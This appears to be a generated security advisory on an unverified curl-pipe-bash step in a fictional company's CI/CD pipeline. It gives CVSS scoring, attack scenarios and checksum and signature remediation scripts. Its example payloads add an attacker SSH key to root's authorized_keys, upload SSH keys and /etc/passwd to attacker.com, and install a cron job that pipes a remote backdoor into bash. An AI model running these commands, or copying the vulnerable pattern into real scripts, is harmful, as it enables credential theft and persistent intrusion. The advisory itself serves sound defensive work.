# Unsafe Remote Shell Script Execution in CI/CD Pipeline

# Vulnerability Case
During a routine code review of Acme Corp's automated deployment scripts in a CI/CD pipeline on Ubuntu servers, we discovered a common pattern where a remote shell script is fetched via `curl` and piped directly into `bash` without integrity verification. The script, intended to update system components, retrieves content from an external update server, but lacks proper validation such as checking a SHA sum or signature. This discovery indicated that if an attacker were able to control or spoof the remote server, malicious commands could be injected, leading to arbitrary code execution. The finding was noted in the evaluation of the deployment process where automated scripts run with elevated privileges, thereby exposing critical production systems.

```bash
#!/bin/bash

# Vulnerable pattern: fetching remote content and executing directly
REMOTE_SCRIPT_URL="http://updates.acme.com/install.sh"

# Critical flaw: unverified content is piped to bash for immediate execution
curl -s "$REMOTE_SCRIPT_URL" | bash
```

The vulnerability stems from piping untrusted remote content directly into a shell interpreter. By controlling the HTTP server (or compromising DNS resolution to redirect the request), an attacker could inject arbitrary shell commands into the stream, which are executed with the privileges of the running script — often root in automated deployment contexts. This lack of validation exposes Acme Corp to remote code execution (RCE), allowing an adversary to modify system configurations, exfiltrate sensitive data, or pivot to other systems in the network. Such exploitation not only undermines system integrity but can also result in significant business impact through service disruption and loss of trust in the secure supply chain processes.

context: bash.curl.security.curl-pipe-bash.curl-pipe-bash Data is being piped into `bash` from a `curl` command. An attacker with control of the server in the `curl` command could inject malicious code into the pipe, resulting in a system compromise. Avoid piping untrusted data into `bash` or any other shell if you can. If you must do this, consider checking the SHA sum of the content returned by the server to verify its integrity.

# Vulnerability Breakdown
This vulnerability involves the unsafe practice of piping untrusted remote content directly into a shell interpreter in a CI/CD deployment pipeline.

1. **Key vulnerability elements**:
   - Remote shell script fetched via HTTP without TLS security
   - No integrity verification (e.g., checksums or signatures)
   - Direct execution of untrusted content via pipe to bash
   - Execution with elevated privileges in a CI/CD context
   - Potential for complete system compromise

2. **Potential attack vectors**:
   - Compromise of the update server (updates.acme.com)
   - Man-in-the-middle attack intercepting HTTP traffic
   - DNS spoofing to redirect the request to a malicious server
   - Network-level interception of deployment traffic

3. **Severity assessment**:
   - The vulnerability can lead to arbitrary code execution
   - Execution happens with elevated privileges (likely root)
   - Impact extends beyond the vulnerable component (changed scope)
   - High impact across confidentiality, integrity, and availability
   - Adjacent attack vector requiring specific network positioning

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Adjacent (A) 
   - Attack Complexity (AC): Low (L) 
   - Privileges Required (PR): None (N) 
   - User Interaction (UI): None (N) 
   - Scope (S): Changed (C)
   - Confidentiality (C): High (H) 
   - Integrity (I): High (H) 
   - Availability (A): High (H) 

# Description
A critical security vulnerability has been identified in Acme Corp's CI/CD pipeline deployment scripts. The scripts fetch remote shell code via an insecure HTTP connection and pipe it directly to bash for execution without any integrity verification. This practice is commonly known as "curl pipe bash" and represents a significant security risk.

```bash
#!/bin/bash

# Vulnerable pattern: fetching remote content and executing directly
REMOTE_SCRIPT_URL="http://updates.acme.com/install.sh"

# Critical flaw: unverified content is piped to bash for immediate execution
curl -s "$REMOTE_SCRIPT_URL" | bash

```

This vulnerability allows an attacker who can intercept network traffic, compromise DNS, or control the update server to inject malicious code that will be executed with the privileges of the deployment pipeline (often root/admin). The absence of TLS encryption, integrity verification, and signature validation creates multiple attack vectors that could lead to complete system compromise.

# CVSS
**Score**: 9.6 \
**Vector**: CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H \
**Severity**: Critical

The Critical (9.6) severity rating is justified by the following factors:

- **Adjacent Attack Vector (AV:A)**: The vulnerability requires the attacker to either control the update server, perform DNS spoofing, or be positioned on the network path between the CI/CD system and the update server. This is more restricted than a pure Network attack vector, but still presents a significant risk.

- **Low Attack Complexity (AC:L)**: Once an attacker is in position to intercept the HTTP request or control the response, exploitation is straightforward. The attacker simply needs to provide a malicious shell script that will be executed without verification.

- **No Privileges Required (PR:N)**: The attacker doesn't need any privileges on the target system to execute this attack, only the ability to control the script source.

- **No User Interaction (UI:N)**: The vulnerability can be exploited without any action from legitimate users, as the CI/CD pipeline automatically executes the script.

- **Changed Scope (S:C)**: The vulnerability exists in the deployment script but affects the entire system where the script runs. Given that it executes with elevated privileges, the impact extends beyond the vulnerable component to potentially the entire production environment.

- **High impacts on Confidentiality, Integrity, and Availability (C:H/I:H/A:H)**: A successful exploit would give attackers complete control over the affected systems, allowing them to access sensitive data, modify system files and configurations, and disrupt services.

# Exploitation Scenarios
**Scenario 1: Update Server Compromise**
An attacker gains unauthorized access to the updates.acme.com server (or compromises a CDN/proxy in front of it). They modify the install.sh script to include malicious commands that create a persistent backdoor. When the CI/CD pipeline runs, it downloads and executes the compromised script, giving the attacker ongoing access to production systems. The attacker could add commands like:

```bash
# Original update script contents here...

# Malicious backdoor
mkdir -p /root/.ssh
echo "ssh-rsa AAAA...attackers-key..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Continue with original script to avoid detection...

```

**Scenario 2: Man-in-the-Middle Attack**
An attacker with access to the network infrastructure between the CI/CD server and updates.acme.com intercepts the HTTP request. Since the connection is unencrypted, they can see the request and respond with their own malicious payload instead of the legitimate script. This is made easier by the use of plain HTTP rather than HTTPS. The attacker's interception could be performed using ARP spoofing, rogue WiFi access points, or compromised network equipment.

**Scenario 3: DNS Poisoning**
The attacker compromises or poisons the DNS infrastructure used by the CI/CD system, causing updates.acme.com to resolve to an IP address under their control. When the deployment script attempts to fetch the update script, the request goes to the attacker's server, which delivers malicious code that gets executed with elevated privileges. This attack could target either local DNS resolvers or, in some cases, attempt to poison DNS caches at a broader level.

**Scenario 4: Supply Chain Attack**
Rather than directly attacking Acme Corp's infrastructure, the attacker compromises a third-party service provider that hosts or delivers the update script. This could be a hosting provider, CDN, or package repository. The attacker makes subtle modifications to the script that are difficult to detect but establish persistence on systems that download and execute it.

# Impact Analysis
**Business Impact:**
- Unauthorized access to sensitive systems, potentially exposing customer data and leading to privacy breaches
- Intellectual property theft if attackers gain access to source code repositories or internal documentation
- Financial loss from operational disruption, remediation costs, and potential ransom demands
- Regulatory penalties for inadequate security controls leading to data breaches
- Reputational damage and loss of customer trust if a breach becomes public
- Possible legal liability for damages resulting from a security incident
- Business continuity issues if critical infrastructure is compromised

**Technical Impact:**
- Complete compromise of CI/CD infrastructure with elevated (likely root) privileges
- Ability to modify application code during deployment, potentially introducing subtle backdoors
- Access to deployment credentials and secrets that could enable lateral movement
- Persistent access to production environments through backdoor installation
- Access to databases and sensitive configuration data
- Potential to pivot to other internal systems through trusted relationships
- Undermining of security controls through privileged access
- Monitoring evasion by operating within legitimate deployment processes
- Supply chain infection if the attackers can persist across multiple deployments

# Technical Details
The vulnerability exists in a deployment script that fetches and executes code from a remote server without verification. Let's examine the technical aspects in detail:

```bash
#!/bin/bash

# Vulnerable pattern: fetching remote content and executing directly
REMOTE_SCRIPT_URL="http://updates.acme.com/install.sh"

# Critical flaw: unverified content is piped to bash for immediate execution
curl -s "$REMOTE_SCRIPT_URL" | bash

```

**Key Technical Issues:**

1. **Lack of HTTPS**: The script uses HTTP instead of HTTPS, making the connection susceptible to eavesdropping and man-in-the-middle attacks. Network traffic is transmitted in plaintext, allowing anyone with network visibility to inspect and modify the content.

2. **Direct Execution**: The downloaded content is piped directly to bash without any intermediate verification, validation, or inspection. This means whatever code is returned by the server (or an attacker) will be executed immediately.

3. **No Integrity Checking**: There's no verification of script integrity using cryptographic hashes (e.g., SHA-256) to ensure the script hasn't been tampered with during transit or at the source.

4. **No Signature Verification**: The script isn't cryptographically signed, so there's no way to verify it comes from a trusted author.

5. **Elevated Privileges**: Since this runs in a CI/CD context, the script likely executes with administrative privileges, magnifying the impact of any compromise.

**Attack Surface and Vectors:**

1. **Network Path**: Any entity with access to the network path between the CI/CD server and the update server can potentially intercept and modify the traffic.

2. **DNS Infrastructure**: The system relies on DNS to resolve updates.acme.com. Compromise of DNS can redirect requests to a malicious server.

3. **Update Server**: Direct compromise of updates.acme.com would allow an attacker to serve malicious content.

4. **Content Delivery Network**: If the update server uses a CDN, compromising the CDN could also enable this attack.

**Exploitation Mechanics:**

When the CI/CD pipeline executes this script:

1. It makes an HTTP request to updates.acme.com to fetch install.sh
2. The response is streamed directly to bash's standard input
3. Bash executes each line of the script as it's received

If an attacker controls the response content, they can include arbitrary shell commands that will be executed with the privileges of the CI/CD pipeline. For example, they could include:

```bash
# Exfiltrate sensitive data
tar czf /tmp/secrets.tar.gz /etc/passwd /home/*/.ssh /etc/*config
curl -X POST -F "file=@/tmp/secrets.tar.gz" http://attacker.com/collect

# Add persistence
echo "*/5 * * * * curl -s http://attacker.com/backdoor.sh | bash" >> /var/spool/cron/root

# Continue with expected script behavior to avoid detection

```

This vulnerability is particularly dangerous because it operates within the trusted deployment pipeline, potentially allowing attackers to introduce malicious code that becomes part of the deployed applications.

# Remediation Steps
## Implement Script Integrity Verification

**Priority**: P0

Modify the deployment process to verify the integrity of downloaded scripts before execution:

```bash
#!/bin/bash

# Use HTTPS instead of HTTP for secure transport
REMOTE_SCRIPT_URL="https://updates.acme.com/install.sh"
REMOTE_CHECKSUM_URL="https://updates.acme.com/install.sh.sha256"
TEMP_SCRIPT="/tmp/install_$$.sh"

# Download the script to a temporary file instead of piping directly
curl -s "$REMOTE_SCRIPT_URL" -o "$TEMP_SCRIPT"

# Fetch the expected checksum
EXPECTED_CHECKSUM=$(curl -s "$REMOTE_CHECKSUM_URL")

# Calculate the actual checksum of the downloaded script
ACTUAL_CHECKSUM=$(sha256sum "$TEMP_SCRIPT" | awk '{print $1}')

# Verify the integrity before execution
if [ "$EXPECTED_CHECKSUM" = "$ACTUAL_CHECKSUM" ]; then
    # Execute the script only if verification passes
    bash "$TEMP_SCRIPT"
    RESULT=$?
    rm -f "$TEMP_SCRIPT"
    exit $RESULT
else
    echo "ERROR: Checksum verification failed. The script may have been tampered with."
    echo "Expected: $EXPECTED_CHECKSUM"
    echo "Actual: $ACTUAL_CHECKSUM"
    rm -f "$TEMP_SCRIPT"
    exit 1
fi

```

This approach:
1. Uses HTTPS to protect against network-level eavesdropping
2. Downloads the script to a temporary file instead of piping directly to bash
3. Verifies the script's integrity using a cryptographic hash
4. Only executes the script if the hash verification passes
5. Properly cleans up temporary files and propagates exit codes
## Implement Cryptographic Signature Verification

**Priority**: P1

Enhance security by implementing cryptographic signature verification using public key cryptography:

```bash
#!/bin/bash

# Use HTTPS for secure transport
REMOTE_SCRIPT_URL="https://updates.acme.com/install.sh"
REMOTE_SIGNATURE_URL="https://updates.acme.com/install.sh.sig"
PUBLIC_KEY="/etc/acme/release-key.pub"
TEMP_SCRIPT="/tmp/install_$$.sh"
TEMP_SIGNATURE="/tmp/install_$$.sig"

# Verify the public key exists
if [ ! -f "$PUBLIC_KEY" ]; then
    echo "ERROR: Public key not found at $PUBLIC_KEY"
    exit 1
fi

# Download the script and signature
curl -s "$REMOTE_SCRIPT_URL" -o "$TEMP_SCRIPT"
curl -s "$REMOTE_SIGNATURE_URL" -o "$TEMP_SIGNATURE"

# Verify the signature
if openssl dgst -sha256 -verify "$PUBLIC_KEY" -signature "$TEMP_SIGNATURE" "$TEMP_SCRIPT"; then
    echo "Signature verification passed. Executing script..."
    # Execute the script only if signature verification passes
    bash "$TEMP_SCRIPT"
    RESULT=$?
    rm -f "$TEMP_SCRIPT" "$TEMP_SIGNATURE"
    exit $RESULT
else
    echo "ERROR: Signature verification failed. The script may have been tampered with."
    rm -f "$TEMP_SCRIPT" "$TEMP_SIGNATURE"
    exit 1
fi

```

This implementation:
1. Uses cryptographic signatures to verify both integrity and authenticity
2. Ensures the script was signed by a trusted party with access to the private key
3. Provides stronger security than checksums alone (which only verify integrity)
4. Establishes a chain of trust for deployment scripts
5. Uses the widely-supported OpenSSL toolkit for verification


# References
* CWE-494 | [Download of Code Without Integrity Check](https://cwe.mitre.org/data/definitions/494.html)
* CWE-78 | [Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html)
* CWE-345 | [Insufficient Verification of Data Authenticity](https://cwe.mitre.org/data/definitions/345.html)
* A08:2021 | [Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
* A03:2021 | [Injection](https://owasp.org/Top10/A03_2021-Injection/)
